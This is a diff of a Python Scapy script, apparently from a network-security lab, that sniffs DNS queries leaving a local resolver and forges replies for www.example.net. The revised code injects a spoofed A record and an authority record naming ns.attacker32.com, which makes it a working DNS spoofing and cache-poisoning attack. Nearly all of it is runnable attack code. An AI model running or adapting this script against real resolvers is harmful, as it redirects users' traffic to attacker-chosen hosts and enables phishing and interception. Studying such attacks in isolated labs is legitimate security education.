@@ -1,48 +1,56 @@
 #!/usr/bin/env python3
 
 from scapy.all import DNS, IP, sniff, UDP, DNSRR, send
-IFACE = 'br-ce54c93dfc36'  # FIXME : Change this to 10.9.0.1 network interface
+IFACE = 'br-fb2031069502'  # FIXME : Change this to 10.9.0.1 network interface
 # Sniff UDP query packets and invoke spoof_dns().
-FILTER = 'udp and dst port 53'
+# Spoof the DNS response to www.example.net for the query packets
+# FILTER = 'udp and dst port 53'
+# Poison the cache of local DNS server to resolve www.example.net to
+FILTER = 'udp and src host 10.9.0.53 and dst port 53'
+DOMAIN = 'www.example.net'
+# Pick an IP address to which the DNS response should be spoofed
+SPOOFED_IP = '208.67.220.220'  # open DNS IP address
 
 
 def spoof_dns(pkt):
-    if (DNS in pkt and 'www.example.com' in pkt[DNS].qd.qname.decode('utf-8')):
+    if DNS in pkt:
+        if DOMAIN in pkt[DNS].qd.qname.decode('utf-8'):
+            print(
+                f"DNS: {pkt[IP].src}: {pkt[UDP].sport} --> \
+                    {pkt[IP].dst}: {pkt[UDP].dport} id: {pkt[DNS].id} \
+                        {pkt[DNS].qd.qname.decode('utf-8')}")
+            print(f'Found {DOMAIN} in query...')
+            # Swap the source and destination IP address
+            IP_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)
 
-        # Swap the source and destination IP address
-        IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)
+            # Swap the source and destination port number
+            UDP_pkt = UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)
 
-        # Swap the source and destination port number
-        UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)
+            # The Answer Section
+            Ans_sec = DNSRR(rrname=pkt[DNS].qd.qname, type='A',
+                            rdata=SPOOFED_IP, ttl=259200)
 
-        # The Answer Section
-        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A',
-                       ttl=259200, rdata='1.2.3.4')
+            # The Authority Section
+            NS_sec = DNSRR(rrname=DOMAIN, type='NS',
+                           rdata='ns.attacker32.com', ttl=259200)
 
-        # The Authority Section
-        NSsec1 = DNSRR(rrname='example.com', type='NS',
-                       ttl=259200, rdata='ns.example.com')
-        NSsec2 = DNSRR(rrname='example.com', type='NS',
-                       ttl=259200, rdata='ns1.example.com')
+            # Construct the DNS packet
+            # qr = 1 (response), opcode = 0 (standard query),
+            # aa = 1 (authoritative answer)
+            DNS_pkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1,
+                          qdcount=1, ancount=1, an=Ans_sec, nscount=1,
+                          ns=NS_sec)
 
-        # The Additional Section
-        Addsec1 = DNSRR(rrname='ns1.example.net', type='A',
-                        ttl=259200, rdata='1.2.3.4')
-        Addsec2 = DNSRR(rrname='ns2.example.net', type='A',
-                        ttl=259200, rdata='5.6.7.8')
-
-        # Construct the DNS packet
-        DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1,
-                     qdcount=1, ancount=1, nscount=2, arcount=2,
-                     an=Anssec, ns=NSsec1/NSsec2, ar=Addsec1/Addsec2)
-
-        # Construct the entire IP packet and send it out
-        spoofpkt = IPpkt/UDPpkt/DNSpkt
-        print("Sending spoofed packet")
-        print(spoofpkt.show())
-        send(spoofpkt)
+            # Construct the entire IP packet and send it out
+            spoofpkt = IP_pkt/UDP_pkt/DNS_pkt
+            print("Sending spoofed packet")
+            print(spoofpkt.show())
+            send(spoofpkt)
+        else:
+            print('No DNS query for ', DOMAIN,
+                  pkt[DNS].qd.qname.decode('utf-8'))
 
 
 if __name__ == "__main__":
-    print('Starting DNS spoofing...')
+    print('Starting DNS sniffing & spoofing...')
     pkt = sniff(iface=IFACE, filter=FILTER, prn=spoof_dns)
